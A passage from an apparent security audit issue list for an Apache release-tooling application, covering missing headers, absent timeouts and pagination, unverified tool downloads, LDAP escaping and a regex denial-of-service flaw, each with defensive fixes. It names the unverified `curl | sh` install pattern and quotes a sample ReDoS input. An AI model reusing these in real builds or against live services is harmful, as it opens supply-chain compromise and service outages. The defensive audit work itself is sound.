- [ ] `SetHandler none` prevents script execution
- [ ] Unit test verifying security headers are present

### References
- Source reports: L2:13.4.3.md
- Related findings: ASVS-1343-MED-002
- ASVS sections: 13.4.3

### Priority
Medium

---

## Issue: FINDING-304 - Development Vhost Missing Vhost-Level Security Headers for Directly Served Content

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The development vhost `tooling-vm-ec2-de.apache.org` lacks vhost-level security headers that are properly configured on the production `release-test.apache.org` vhost. While individual directory blocks like `/downloads/` have their own security headers, directly served content outside these blocks (such as `/~sbp/`) lacks HSTS, framing protection, MIME sniffing prevention, and referrer leakage controls.

### Details
Configuration in `tooling-vm-ec2-de.apache.org.yaml` is missing vhost-level headers:
- **HSTS:** Downgrade attacks possible
- **X-Frame-Options:** Clickjacking vulnerability
- **X-Content-Type-Options:** MIME sniffing attacks possible
- **Referrer-Policy:** Information leakage through referrer headers

Proxied content receives headers from the backend application, but directly served paths are unprotected.

### Recommended Remediation
Add vhost-level security headers to the `tooling-vm-ec2-de.apache.org` vhost:

```yaml
# Security Headers
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set Referrer-Policy "same-origin"
```

### Acceptance Criteria
- [ ] Vhost-level security headers configured
- [ ] HSTS header prevents downgrade attacks
- [ ] All directly served content receives security headers
- [ ] Unit test verifying headers are present

### References
- Source reports: L2:13.4.3.md
- Related findings: ASVS-1343-MED-001
- ASVS sections: 13.4.3

### Priority
Medium

---

## Issue: FINDING-305 - OSV Vulnerability Scanning Has No HTTP Timeout

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The OSV vulnerability scanning functionality makes external HTTP requests to `api.osv.dev` without specifying timeouts. This can cause worker processes to hang if the OSV API is slow or unresponsive, leading to worker starvation and task failures.

### Details
Affected functions in `atr/sbom/osv.py`:
- `scan_bundle()`
- `_fetch_vulnerabilities_for_batch()`
- `_fetch_vulnerability_details()`

The codebase provides a `create_secure_session()` utility that accepts an optional `timeout` parameter, but OSV scanning does not use it. Worker process isolation and worker manager 300s timeout backstop provide some protection but are coarse-grained.

### Recommended Remediation
Apply timeout to session creation:

```python
_OSV_REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=60, connect=10)

async with util.create_secure_session(timeout=_OSV_REQUEST_TIMEOUT) as session:
    # existing logic
```

Apply same fix to:
- Distribution platform checks (`atr/shared/distribution.py`)
- Apache metadata sources (`atr/datasources/apache.py`)
- GitHub API (`atr/tasks/gha.py`)
- Thread messages (`atr/util.py`)

### Acceptance Criteria
- [ ] All OSV API calls include explicit timeout
- [ ] Timeout prevents indefinite worker hangs
- [ ] Worker recovery after timeout
- [ ] Unit test verifying timeout behavior

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-083, FINDING-307, FINDING-087, FINDING-316
- ASVS sections: 15.1.3

### Priority
Medium

---

## Issue: FINDING-306 - Unbounded Response Sizes on Multiple List Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Multiple endpoints return unbounded result sets without pagination or limits. Affected endpoints may return thousands of records, causing excessive memory consumption and slow response times. Code comments acknowledge the issue ('TODO: We should perhaps paginate this') but it remains unaddressed.

### Details
Affected endpoints in `atr/api/__init__.py`:
1. `/api/checks/list/<project>/<version>` (checks_list()) - may return thousands of check results
2. `/api/release/paths/<project>/<version>` (release_paths()) - collects all file paths in memory

Affected admin endpoints in `atr/admin/__init__.py`:
3. `/admin/data/<model>` (_data_browse()) - loads all database records
4. `/admin/consistency` (consistency()) - walks entire filesystem

### Recommended Remediation
Add pagination to API endpoints using query parameters (limit/offset):

```python
_MAX_RESULTS = 100

# For checks_list() and release_paths():
limit, offset = _pagination_args_validate(query_args)
# Apply LIMIT and OFFSET to queries

# For admin endpoints:
_MAX_BROWSE_RECORDS = 500
# Implement page-based pagination

# Include total count in responses for pagination UI
```

Fix typo in `_pagination_args_validate()` (see FINDING-359).

### Acceptance Criteria
- [ ] All list endpoints implement pagination
- [ ] Default and maximum limits enforced
- [ ] Response includes total count for UI pagination
- [ ] Unit test verifying pagination behavior

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-018, FINDING-083, FINDING-319
- ASVS sections: 15.1.3

### Priority
Medium

---

## Issue: FINDING-307 - Thread Message Fetching Without Timeout or Concurrency Limit

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The thread message fetching functionality retrieves email messages from Apache mailing list archives without applying HTTP timeouts or limiting concurrent requests. For threads with hundreds of messages, this creates hundreds of simultaneous HTTP requests with no semaphore control, causing connection exhaustion and potential rate limiting.

### Details
Affected functions in `atr/util.py`:
- `thread_messages()`
- `get_urls_as_completed()`

Each request can hang indefinitely without timeouts. No concurrency control exists for bulk fetching operations.

### Recommended Remediation
Apply timeout and concurrency controls:

```python
_THREAD_TIMEOUT = aiohttp.ClientTimeout(total=30, connect=10)
_MAX_THREAD_MESSAGES = 200
_FETCH_CONCURRENCY = 20

# Add concurrency control using asyncio.Semaphore in get_urls_as_completed()
async def get_urls_as_completed(urls, timeout=_THREAD_TIMEOUT, max_concurrent=_FETCH_CONCURRENCY):
    semaphore = asyncio.Semaphore(max_concurrent)
    # ... implementation
```

Update function signatures to accept timeout and max_concurrent parameters.

### Acceptance Criteria
- [ ] HTTP timeout configured for message fetching
- [ ] Concurrency limited to prevent connection exhaustion
- [ ] Maximum message count enforced
- [ ] Unit test verifying timeout and concurrency limits

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-305, FINDING-083
- ASVS sections: 15.1.3

### Priority
Medium

---

## Issue: FINDING-308 - ZIP Download Streaming Without Size or Time Guards

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The ZIP download endpoint streams an archive of all files in a release directory without checking total size, file count, or imposing streaming timeouts. For releases with many large files (50,000 files, 20 GB total), this causes extended resource consumption during ZIP generation and transfer, potentially holding server resources for hours on slow client connections.

### Details
Affected function in `atr/get/download.py`:
- `zip_selected()`

Authentication and rate limiting provide some protection, but no resource limits exist for ZIP operations.

### Recommended Remediation
Add resource limits before streaming:

```python
_MAX_ZIP_FILES = 10000
_MAX_ZIP_TOTAL_BYTES = 10 * 1024 * 1024 * 1024  # 10 GB

# Track cumulative size while collecting files
total_size = 0
file_count = 0
for file_path in files_to_zip:
    file_count += 1
    total_size += file_path.stat().st_size
    if file_count > _MAX_ZIP_FILES or total_size > _MAX_ZIP_TOTAL_BYTES:
        return quart.Response("Archive too large", status=413)

# Log metrics for monitoring (file count, total size)
```

Consider alternative approach for very large releases: provide manifest file with individual download links instead of ZIP streaming.

### Acceptance Criteria
- [ ] Maximum file count enforced before streaming
- [ ] Maximum total size enforced before streaming
- [ ] 413 status returned with helpful message if limits exceeded
- [ ] Metrics logged for monitoring
- [ ] Unit test verifying size limits

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-083
- ASVS sections: 15.1.3

### Priority
Medium

---

## Issue: FINDING-309 - Unbounded Distribution Status Check Loop

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The distribution status check task queries all pending distributions and processes them sequentially without batch size limits. If many distributions are pending (e.g., 500 due to temporary external service outage), the task attempts to process every one, potentially exceeding the 300s worker timeout and leaving distributions in inconsistent state.

### Details
Affected function in `atr/tasks/distribution.py`:
- `status_check()`

When the worker is killed mid-processing, some distributions are updated while others remain pending, creating an inconsistent state.

### Recommended Remediation
Implement batch processing:

```python
_BATCH_SIZE = 20

async def status_check():
    # Process at most 20 distributions per task run
    pending = await get_pending_distributions(limit=_BATCH_SIZE)
    
    for distribution in pending:
        # ... process distribution
    
    # Log progress
    logging.info(f"Processed {len(pending)} of {total_pending} pending distributions")
    
    # Task will be rescheduled to process remaining distributions
```

### Acceptance Criteria
- [ ] Batch size limit implemented (max 20 per run)
- [ ] Progress logged indicating processed vs remaining
- [ ] Task rescheduled automatically for remaining items
- [ ] Worker timeout no longer exceeded
- [ ] Unit test verifying batch processing

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-305, FINDING-083
- ASVS sections: 15.1.3

### Priority
Medium

---

## Issue: FINDING-310 - No Documented Risk-Based Remediation Timeframes for Vulnerable Components

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The application implements comprehensive vulnerability detection infrastructure (OSV scanning, pip-audit pre-commit hooks, SBOM quality scoring, severity mapping) but lacks documented policy defining risk-based remediation timeframes that differentiate by severity. This is fundamentally a documentation gap rather than a technical deficiency.

### Details
Vulnerabilities are detected and reported only—there is no documented policy defining risk-based remediation timeframes. Affected areas:
- `SECURITY.md` (no remediation SLAs)
- `atr/sbom/osv.py` (detection only)
- `atr/tasks/sbom.py` lines 280-350 (scoring without remediation policy)

### Recommended Remediation
Create a documented remediation policy in `docs/dependency-remediation-policy.md` or add section to `SECURITY.md`:

**Risk-based SLAs:**
- Critical (CVSS ≥9.0): 48 hours
- High (CVSS 7.0-8.9): 7 days
- Medium (CVSS 4.0-6.9): 30 days
- Low (CVSS <4.0): 90 days

**Document:**
- Emergency override process for bypassing Dependabot cooldown
- High-risk dependencies (cryptography, aiohttp, jinja2, sqlalchemy, pyjwt)
- Enhanced monitoring for high-risk components
- Severity table and enforcement mechanisms

Total effort: ~1 day.

### Acceptance Criteria
- [ ] Remediation policy documented with severity-based SLAs
- [ ] Emergency patching process documented
- [ ] High-risk components identified and monitored
- [ ] Enforcement mechanisms defined

### References
- Source reports: L1:15.1.1.md
- Related findings: FINDING-490, FINDING-491
- ASVS sections: 15.1.1

### Priority
Medium

---

## Issue: FINDING-311 - No Documented Update Timeframe for npm/Frontend Dependencies

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The npm/frontend dependency ecosystem lacks documented update timeframes and automated freshness enforcement, creating an asymmetric policy where Python dependencies have a 30-day documented timeframe but npm dependencies have none. While vulnerability scanning exists via npm audit, there is no mechanism to prevent deployment of stale but non-vulnerable versions.

### Details
Affected files:
- `bootstrap/source/package.json` line 3
- `bootstrap/context/bump.sh` lines 14-16

The bootstrap/context/bump.sh script implements a 14-day cooldown that prevents TOO-NEW versions but has no check for TOO-OLD versions.

### Recommended Remediation
1. **Add npm to Dependabot** (`.github/dependabot.yml`) with weekly schedule and 14-day cooldown to match existing bump.sh cooldown

2. **Add npm freshness check** (`scripts/check_npm_dependencies_updated.py`):
   - Check last modification date of `package-lock.json`
   - Enforce 60-day maximum age
   - Integrate into pre-commit hooks

3. **Document policy** in `DEPENDENCIES.md`:
   - 60-day maximum age for npm dependencies
   - 14-day cooldown period
   - Update procedures

### Acceptance Criteria
- [ ] Dependabot configured for npm dependencies
- [ ] Freshness check script implemented
- [ ] Policy documented in DEPENDENCIES.md
- [ ] Pre-commit hook enforces freshness
- [ ] Unit test verifying freshness enforcement

### References
- Source reports: L1:15.2.1.md
- Related findings: None
- ASVS sections: 15.2.1

### Priority
Medium

---

## Issue: FINDING-312 - No Update Timeframe or Monitoring for Dockerfile-Installed External Tools

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Five external tools are installed in the Docker image with pinned versions but no documented update timeframes, automated monitoring, or consistent integrity verification. These tools process untrusted user input (SBOM files, release archives), making vulnerability exposure particularly concerning.

### Details
Affected tools in `Dockerfile.alpine` lines 45-71:
- syft 1.38.2 (lines 62-64)
- parlay 0.9.0
- sbomqs 1.1.0
- cyclonedx-cli 0.29.1 (line 71)
- Apache RAT 0.18

Apache RAT has proper SHA512 verification, but syft and cyclonedx-cli are installed via curl without hash verification.

### Recommended Remediation
1. **Add CI check for Dockerfile tool versions** (`scripts/check_dockerfile_tool_versions.py`):
   - Parse ENV variables for tool versions
   - Check age of GitHub releases via API
   - Enforce 90-day maximum age
   - Integrate into `.github/workflows/analyze.yml`

2. **Add hash verification** for curl-installed tools following Apache RAT pattern with SHA256 verification

3. **Document policy** in `DEPENDENCIES.md`:
   - 90-day maximum age for external tools
   - SHA256/SHA512 hash requirements
   - Update procedures

### Acceptance Criteria
- [ ] CI check implemented for tool version freshness
- [ ] Hash verification added for all curl-installed tools
- [ ] Policy documented in DEPENDENCIES.md
- [ ] CI fails if tools exceed 90-day age
- [ ] Unit test verifying hash verification

### References
- Source reports: L1:15.2.1.md
- Related findings: FINDING-313, FINDING-314
- ASVS sections: 15.2.1

### Priority
Medium

---

## Issue: FINDING-313 - Binary Tool Downloaded Without Integrity Verification (CycloneDX CLI)

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The CycloneDX CLI binary is downloaded from GitHub without any hash or signature verification. The code includes an explicit `# TODO: Check hash` comment acknowledging this gap. A compromised GitHub release or MITM attack could inject a malicious binary into the build that processes SBOM data.

### Details
Affected file: `Dockerfile.alpine` lines 45-48

If the CycloneDX CLI binary is tampered with at the source, ATR would incorporate a potentially malicious binary into its Docker image.

### Recommended Remediation
Add SHA256 hash verification for CycloneDX CLI download:

```dockerfile
ENV CDXCLI_SHA256=<hash_from_github_release>

RUN curl -L https://github.com/CycloneDX/cyclonedx-cli/releases/download/v${CDXCLI_VERSION}/cyclonedx-linux-musl-x64 -o /usr/local/bin/cyclonedx \
    && echo "${CDXCLI_SHA256}  /usr/local/bin/cyclonedx" | sha256sum -c - \
    && chmod +x /usr/local/bin/cyclonedx
```

Obtain hash from official GitHub release page.

### Acceptance Criteria
- [ ] SHA256 hash verification added to CycloneDX CLI download
- [ ] Build fails if hash verification fails
- [ ] Hash value documented and sourced from official release
- [ ] Unit test verifying hash verification

### References
- Source reports: L2:15.1.2.md
- Related findings: FINDING-312, FINDING-314
- ASVS sections: 15.1.2

### Priority
Medium

---

## Issue: FINDING-314 - Syft Installed via Unverified Remote Script Execution

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Syft is installed by piping a remote shell script from GitHub directly into `sh`. While HTTPS and version pinning in the URL provide some protection, the script itself could be modified (e.g., via GitHub account compromise) without detection. Syft is the primary tool for generating SBOMs from release artifacts—a compromised binary could generate falsified SBOMs that hide vulnerable components.

### Details
Affected file: `Dockerfile.alpine` lines 37-39

The previous approach using `go install` (commented out) would have leveraged Go module checksums for integrity.

### Recommended Remediation
Replace `curl | sh` pattern with direct binary download and hash verification:

```dockerfile
ENV SYFT_SHA256=<hash_from_github_release>

RUN curl -sSfL "https://github.com/anchore/syft/releases/download/v${SYFT_VERSION}/syft_${SYFT_VERSION}_linux_amd64.tar.gz" -o /tmp/syft.tar.gz \
    && echo "${SYFT_SHA256}  /tmp/syft.tar.gz" | sha256sum -c - \
    && tar -xzf /tmp/syft.tar.gz -C /usr/local/bin syft \
    && rm /tmp/syft.tar.gz
```

**Alternative:** Restore `go install` approach which provides Go module checksum verification.

### Acceptance Criteria
- [ ] Syft installed via direct binary download with hash verification OR go install
- [ ] Build fails if hash verification fails
- [ ] No remote script execution via curl | sh
- [ ] Unit test verifying installation method

### References
- Source reports: L2:15.1.2.md
- Related findings: FINDING-312, FINDING-313
- ASVS sections: 15.1.2

### Priority
Medium

---

## Issue: FINDING-315 - No Formal SBOM for ATR's Own Third-Party Dependencies

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
While ATR provides comprehensive SBOM generation, validation, and management tooling for projects it serves, ATR does not maintain a formal SBOM (CycloneDX or SPDX format) for its own third-party dependencies. Without a formal SBOM, automated supply chain analysis tools cannot consume ATR's dependency information in a standardized way.

### Details
The `pip-audit.requirements` file serves as an informal inventory with exact versions, and `uv.lock` pins resolved versions, but neither constitutes a standard-format SBOM.

Affected: Project root (missing artifact)

### Recommended Remediation
Add SBOM generation to CI workflow using cyclonedx-py or syft:

```yaml
# In .github/workflows/
- name: Generate SBOM
  run: uv run --frozen cyclonedx-py environment --output-format json --outfile sbom.cdx.json

- name: Upload SBOM
  uses: actions/upload-artifact@v3
  with:
    name: sbom
    path: sbom.cdx.json
```

Add Makefile target for local SBOM generation:

```makefile
.PHONY: sbom
sbom:
	uv run --frozen cyclonedx-py environment --output-format json --outfile sbom.cdx.json
```

Publish SBOM with releases.

### Acceptance Criteria
- [ ] SBOM generated in CI workflow
- [ ] SBOM uploaded as build artifact
- [ ] SBOM published with releases
- [ ] Makefile target for local SBOM generation
- [ ] SBOM validates against CycloneDX/SPDX schema

### References
- Source reports: L2:15.1.2.md
- Related findings: None
- ASVS sections: 15.1.2

### Priority
Medium

---

## Issue: FINDING-316 - OSV API Unbounded Pagination and Detail Fetching

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The OSV API pagination implementation has no maximum page limit, and vulnerability detail fetching has no concurrency bounds. Components with hundreds of vulnerabilities cause hundreds of sequential HTTP requests, consuming worker resources for extended periods.

### Details
Affected functions in `atr/sbom/osv.py`:
- Lines 227-246: Pagination while loop has no iteration limit
- Lines 268-283: Unique vulnerability detail fetching has no total count or individual timeout limits

### Recommended Remediation
Add resource limits:

```python
_MAX_PAGINATION_PAGES = 20
_MAX_VULNERABILITIES_PER_COMPONENT = 500
_MAX_VULNERABILITY_DETAILS = 200
_VULNERABILITY_DETAIL_TIMEOUT = 10

# Check page count in pagination loop
page_count = 0
while has_more:
    page_count += 1
    if page_count > _MAX_PAGINATION_PAGES:
        logging.warning(f"Exceeded max pages ({_MAX_PAGINATION_PAGES}), stopping pagination")
        break
    # ... existing logic

# Truncate unique_ids set to maximum count
if len(unique_ids) > _MAX_VULNERABILITY_DETAILS:
    logging.warning(f"Truncating {len(unique_ids)} vulnerabilities to {_MAX_VULNERABILITY_DETAILS}")
    unique_ids = set(list(unique_ids)[:_MAX_VULNERABILITY_DETAILS])

# Wrap each detail fetch with timeout
for vuln_id in unique_ids:
    try:
        await asyncio.wait_for(
            _fetch_vulnerability_details(session, vuln_id),
            timeout=_VULNERABILITY_DETAIL_TIMEOUT
        )
    except asyncio.TimeoutError:
        logging.warning(f"Timeout fetching details for {vuln_id}")
```

### Acceptance Criteria
- [ ] Maximum pagination pages enforced
- [ ] Maximum vulnerability count enforced
- [ ] Individual detail fetches have timeout
- [ ] Warning logged when limits exceeded
- [ ] Unit test verifying limits

### References
- Source reports: L2:15.2.2.md
- Related findings: FINDING-305
- ASVS sections: 15.2.2

### Priority
Medium

---

## Issue: FINDING-317 - SSH Server Lacks Connection and Idle Timeouts

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The SSH server configuration lacks keepalive and idle timeout settings. Authenticated connections can remain idle indefinitely, exhausting the server's connection capacity over time. No automatic cleanup of stale connections exists.

### Details
Affected file: `atr/ssh.py` line 181

The `asyncssh.create_server()` call does not specify keepalive parameters.

### Recommended Remediation
Add keepalive parameters to `asyncssh.create_server()` call:

```python
SSH_KEEPALIVE_INTERVAL = 30  # seconds
SSH_KEEPALIVE_COUNT_MAX = 3  # missed keepalives before disconnect

server = await asyncssh.create_server(
    # ... existing parameters
    keepalive_interval=SSH_KEEPALIVE_INTERVAL,
    keepalive_count_max=SSH_KEEPALIVE_COUNT_MAX
)
```

This sends keepalive every 30 seconds and closes connections after 3 missed keepalives (90s total idle time).

Add configuration options for these parameters.

### Acceptance Criteria
- [ ] Keepalive interval configured (30 seconds)
- [ ] Maximum missed keepalives configured (3)
- [ ] Idle connections automatically closed after 90 seconds
- [ ] Configuration options added for keepalive parameters
- [ ] Unit test verifying timeout behavior

### References
- Source reports: L2:15.2.2.md
- Related findings: FINDING-081
- ASVS sections: 15.2.2

### Priority
Medium

---

## Issue: FINDING-318 - SBOM Conformance External HTTP Requests Without Explicit Timeout

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
SBOM conformance checking makes N sequential HTTP requests to `api.deps.dev` with only aiohttp's default 300-second timeout. No explicit timeout or request count limit is configured. SBOMs with 50 components result in 50 sequential API calls, each waiting up to 300s.

### Details
Affected file: `atr/sbom/conformance.py` lines 30-120

### Recommended Remediation
Add timeout and limit constants:

```python
_HTTP_TIMEOUT = aiohttp.ClientTimeout(total=10)
_MAX_SUPPLIER_LOOKUPS = 50

async def check_conformance(...):
    lookup_count = 0
    
    async with create_secure_session(timeout=_HTTP_TIMEOUT) as session:
        for component in components:
            if lookup_count >= _MAX_SUPPLIER_LOOKUPS:
                logging.warning(f"Reached max supplier lookups ({_MAX_SUPPLIER_LOOKUPS})")
                break
            
            await session.get(url, timeout=_HTTP_TIMEOUT)
            lookup_count += 1
```

### Acceptance Criteria
- [ ] Explicit 10-second timeout configured
- [ ] Maximum lookup count enforced (50)
- [ ] Warning logged when limit exceeded
- [ ] Unit test verifying timeout and limit

### References
- Source reports: L2:15.2.2.md
- Related findings: FINDING-305
- ASVS sections: 15.2.2

### Priority
Medium

---

## Issue: FINDING-319 - Admin Data Browser Loads All Records Without Pagination

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The administrative data browser executes `.all()` queries without pagination. For models like CheckResult and Task that can have millions of rows, this loads all records into memory, causing excessive database I/O and memory consumption.

### Details
Affected file: `atr/admin/__init__.py` lines 500-530

The `_data_browse()` function queries models without LIMIT or OFFSET.

### Recommended Remediation
Add pagination:

```python
BROWSE_PAGE_SIZE = 100

async def _data_browse(model: str, page: int = 1):
    offset = (page - 1) * BROWSE_PAGE_SIZE
    
    # Apply limit and offset to query
    records = await query.limit(BROWSE_PAGE_SIZE).offset(offset).all()
    
    # Fetch total count for pagination UI
    total_count = await query.count()
    total_pages = (total_count + BROWSE_PAGE_SIZE - 1) // BROWSE_PAGE_SIZE
    
    # Update template to include pagination controls
    return await render_template(
        'admin/browse.html',
        records=records,
        page=page,
        total_pages=total_pages
    )
```

### Acceptance Criteria
- [ ] Pagination implemented with 100 records per page
- [ ] LIMIT and OFFSET applied to queries
- [ ] Total count fetched for UI pagination
- [ ] Template updated with page navigation controls
- [ ] Unit test verifying pagination

### References
- Source reports: L2:15.2.2.md
- Related findings: FINDING-306
- ASVS sections: 15.2.2

### Priority
Medium

---

## Issue: FINDING-320 - Unbounded PGP Key Block Processing in Bulk Operations

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The bulk PGP key processing function has no limit on the number of key blocks processed per request. Each block triggers CPU-intensive PGP parsing operations. Attackers can submit 1000+ key blocks in a single request, monopolizing workers until CPU limit kills the process.

### Details
Affected file: `atr/storage/writers/keys.py` line 388

The function processes all key blocks without checking count.

### Recommended Remediation
Add key block limit:

```python
_MAX_KEY_BLOCKS_PER_REQUEST = 100

async def process_key_blocks(key_blocks: list):
    if len(key_blocks) > _MAX_KEY_BLOCKS_PER_REQUEST:
        return AccessError(
            f"Too many key blocks. Maximum {_MAX_KEY_BLOCKS_PER_REQUEST} per request."
        )
    
    # ... existing processing logic
```

This aligns with the single-block enforcement in `FoundationCommitter.__ensure_one()`.

### Acceptance Criteria
- [ ] Maximum key block count enforced (100)
- [ ] Error returned with clear message if limit exceeded
- [ ] Unit test verifying limit enforcement
- [ ] Consistent with single-block enforcement elsewhere

### References
- Source reports: L2:15.2.2.md
- Related findings: None
- ASVS sections: 15.2.2

### Priority
Medium

---

## Issue: FINDING-321 - Implicit Reliance on cmarkgfm Default Safe Behavior Without Explicit Configuration

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The application correctly uses cmarkgfm with safe defaults, but the safety is implicit rather than explicit. This creates maintenance risks where future developers could add `options=cmarkgfm.Options.CMARK_OPT_UNSAFE` without recognizing security implications. While currently secure, this represents a code quality and defense-in-depth gap.

### Details
Affected files:
- `atr/get/checklist.py` line 55
- `scripts/gfm_to_html.py` line 35

Issues:
- No code comment documenting the security requirement
- No explicit `options=0` parameter (relies on library default)
- No unit test verifying raw HTML suppression
- Future modifications could inadvertently introduce UNSAFE flag

### Recommended Remediation
**Immediate (Priority 1):** Add unit tests to verify cmarkgfm suppresses:
- Raw HTML
- JavaScript URLs
- Data URLs

**Short-term (Priority 2):** Make security requirement explicit:

```python
_SAFE_CMARKGFM_OPTIONS = 0  # IMPORTANT: Do not add CMARK_OPT_UNSAFE - see ASVS 1.3.5

html = cmarkgfm.github_flavored_markdown_to_html(markdown, options=_SAFE_CMARKGFM_OPTIONS)
```

**Long-term:** Pin cmarkgfm version in requirements.txt with comment noting verified safe behavior per ASVS 1.3.5.

### Acceptance Criteria
- [ ] Unit tests verify HTML suppression
- [ ] Explicit options parameter with security comment
- [ ] Version pinned with security note
- [ ] Documentation updated

### References
- Source reports: L2:1.3.5.md
- Related findings: FINDING-026, FINDING-096
- ASVS sections: 1.3.5

### Priority
Low

---

## Issue: FINDING-322 - LDAP Filter Construction via String Interpolation Without escape_filter_chars() in _get_project_memberships

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `_get_project_memberships()` method constructs LDAP filters using string interpolation without applying `ldap3.utils.conv.escape_filter_chars()`. While the `Committer.__init__()` method validates the user parameter with a strict regex (`^[-_a-z0-9]+$`), this creates coupling where filter safety depends entirely on upstream validation. If the regex were ever modified to allow additional characters, LDAP injection would become possible.

### Details
Affected file: `atr/principal.py`
- Line 142: LDAP filter construction
- Lines 34-35: Upstream regex validation

This violates defense-in-depth principles by not encoding at the point of use.

### Recommended Remediation
Apply defense-in-depth by adding `escape_filter_chars()` at the point of filter construction:

```python
from ldap3.utils import conv

async def _get_project_memberships(self):
    escaped_user = conv.escape_filter_chars(self.user)
    ldap_filter = f"(uid={escaped_user})"  # or use existing format string
    result = ldap_search.search(..., ldap_query=ldap_filter, ...)
```

### Acceptance Criteria
- [ ] LDAP filter escaping applied at point of use
- [ ] Defense-in-depth maintained regardless of upstream validation
- [ ] Unit test verifying escaping with special characters
- [ ] No dependency on upstream regex validation for injection safety

### References
- Source reports: L2:1.2.6.md
- Related findings: FINDING-103
- ASVS sections: 1.2.6

### Priority
Low

---

## Issue: FINDING-323 - Task Argument Models Lack Safe Type Re-Validation at Deserialization

**Labels:** bug, security, priority:low, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
Task argument models (FileArgs, ScoreArgs) accept validated inputs from web routes but do not re-apply safe type validation when deserializing in worker processes. This creates a trust boundary gap at the process boundary. While `project_key`, `version_key`, and `revision_number` are re-validated within function bodies, `file_path` is NOT re-validated.

### Details
Affected file: `atr/tasks/sbom.py` lines 39-43

The web layer validates inputs through safe types (safe.ProjectKey, safe.VersionKey, safe.RelPath), then serializes to plain strings for the task queue. Worker processes deserialize these as plain string types without re-validation through the safe type system.

### Recommended Remediation
Add Pydantic model validator to re-validate all fields through safe types at deserialization:

```python
@pydantic.model_validator(mode='after')
def validate_safe_types(self) -> 'FileArgs':
    safe.ProjectKey(self.project_key)
    safe.VersionKey(self.version_key)
    safe.RevisionNumber(self.revision_number)
    safe.RelPath(self.file_path)
    return self
```

Apply similar validation to ScoreArgs and other task argument models.

### Acceptance Criteria
- [ ] Model validator added to re-validate all fields
- [ ] All task argument models updated
- [ ] Unit test verifying re-validation at deserialization
- [ ] Trust boundary properly enforced at process boundary

### References
- Source reports: L1:1.2.5.md, L2:1.3.3.md
- Related findings: FINDING-104
- ASVS sections: 1.2.5, 1.3.3

### Priority
Low

---

## Issue: FINDING-324 - Regex Escaping Applied Only as Fallback in Committee Directory Filter

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The committee directory filter applies regex escaping only as a fallback when the initial unescaped regex construction fails. Valid but malicious regex patterns (e.g., ReDoS patterns like `(a+)+`) pass through the primary path without escaping, creating a ReDoS vulnerability that can cause catastrophic backtracking and browser unresponsiveness.

### Details
Affected file: `atr/static/js/src/committee-directory.js` lines 36-50

Syntactically invalid patterns are correctly caught and escaped, but valid malicious patterns are not.

### Recommended Remediation
Always escape first for literal matching:

```javascript
function filterProjects(projectFilter) {
    // Always escape for literal matching
    const escapedFilter = projectFilter.replaceAll(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regex = new RegExp(escapedFilter, 'i');
    
    // ... use regex
}
```

For advanced use cases with explicit regex mode:
- Add checkbox control for "Use Regular Expression"
- Validate patterns only when explicitly requested by user
- Show warning about ReDoS risks in UI

### Acceptance Criteria
- [ ] Input always escaped before regex construction
- [ ] No ReDoS vulnerability with pathological patterns
- [ ] Optional: Advanced regex mode with explicit opt-in
- [ ] Unit test verifying ReDoS patterns are escaped

### References
- Source reports: L2:1.2.9.md
- Related findings: FINDING-105
- ASVS sections: 1.2.9

### Priority
Low

---

## Issue: FINDING-325 - Revision Description Parameter Lacks Documented Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The description parameter in revision creation functions accepts arbitrary strings with no documented or enforced validation constraints. While parameterized queries prevent SQL injection and Jinja2 auto-escapes output, the lack of validation rules violates ASVS 2.1.1. Unbounded string length could cause database storage issues.

### Details
Affected file: `atr/storage/writers/revision.py`
- Line 45: `create_revision_with_quarantine()`
- Line 95: `finalise_revision()`

No validation for:
- Maximum length
- Character set restrictions (control characters)
- Whitespace handling

### Recommended Remediation
Create `_validate_description()` function:

```python
_MAX_DESCRIPTION_LENGTH = 1000

def _validate_description(description: str) -> str:
